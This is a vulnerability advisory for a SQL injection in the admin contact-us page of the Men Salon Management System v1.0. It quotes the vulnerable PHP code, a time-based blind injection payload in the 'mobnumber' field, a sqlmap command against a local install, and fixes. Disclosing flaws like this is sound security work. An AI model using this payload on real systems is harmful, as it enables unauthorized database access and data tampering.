# Title: [sql-inject] in [Men-Salon-Management-System] <= [v1.0]
**BUG_Author**: [1098024193,yaklang. io]

---

## Product Information  产品信息
- **Vendor Homepage**: [link](https://phpgurukul.com/men-salon-management-system-using-php-and-mysql/)
- **Software Link**: [download-link](https://phpgurukul.com/?sdm_process_download=1&download_id=14066)
- **Affected Version**: [<= v1.0]
## Vulnerability Details
### Vulnerable Files
- /admin/contact-us.php
### Vulnerability Type
**SQL Injection Vulnerability** (CWE-89: SQL Injection)
### Root Cause
The code directly concatenates user input into SQL query strings without any parameterization or input validation, allowing attackers to inject malicious SQL code.
```php
line:18
if(isset($_POST['submit']))
  {
    $bpmsaid=$_SESSION['bpmsaid'];
     $pagetitle=$_POST['pagetitle'];
$pagedes=$_POST['pagedes'];
$email=$_POST['email'];
$mobnumber=$_POST['mobnumber'];
$timing=$_POST['timing'];
     
    $query=mysqli_query($con,"update tblpage set PageTitle='$pagetitle',Email='$email',MobileNumber='$mobnumber',Timing='$timing',PageDescription='$pagedes' where  PageType='contactus'");
    if ($query) {
    
    echo '<script>alert("Contact Us has been updated")</script>';
  }
  else
    {
      echo '<script>alert("Something Went Wrong. Please try again.")</script>';
    }
  
}
```
## Impact
- Unauthorized access to database information
- Potential exposure of sensitive information (such as user passwords)
- Possible database corruption or data manipulation
## Description
1. Vulnerability Details:
- During the security review of "Men Salon Management System",I discovered a critical SQL injection vulnerability "/admin/contact-us.php" file. This vulnerability stems from insufficient user input validation of the 'mobnumber' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.
2. Attack Payload Examples:
```bash
Parameter: mobnumber (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: pagetitle=Contact Us&email=info@gmail.com&mobnumber=7896541236' AND (SELECT 3235 FROM (SELECT(SLEEP(5)))KBOo) AND 'xfxx'='xfxx&timing=10:30 am to 8:30 pm&pagedes=                                        890,Sector 62, Gyan Sarovar, GAIL Noida(Delhi%2&submit=
```
## CodeScan
This vulnerability is found by [IRify](https://github.com/wlingze/IRify_scan/issues/ssa.to) :

![Image](/Men-Salon-Management-System/image/SQL1.png)

## Proof by the tool of Sqlmap
```bash
sqlmap  -u  "http://127.0.0.1/msmspdemo/admin/contact-us.php" --data "pagetitle=Contact+Us&email=info%40gmail.com&mobnumber=7896541236&timing=10%3A30+am+to+8%3A30+pm&pagedes=1&submit="  --dbs
```

![Image](/Men-Salon-Management-System/image/SQL2.png)+

this valnerability validation by [Yakit](https://www.yaklang.io/)

## Suggested repair

1. Use prepared statements and parameter binding:
   Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. Input validation and filtering:
   Strictly validate and filter user input data to ensure it conforms to the expected format.

3. Minimize database user permissions:
   Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. Regular security audits:
   Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.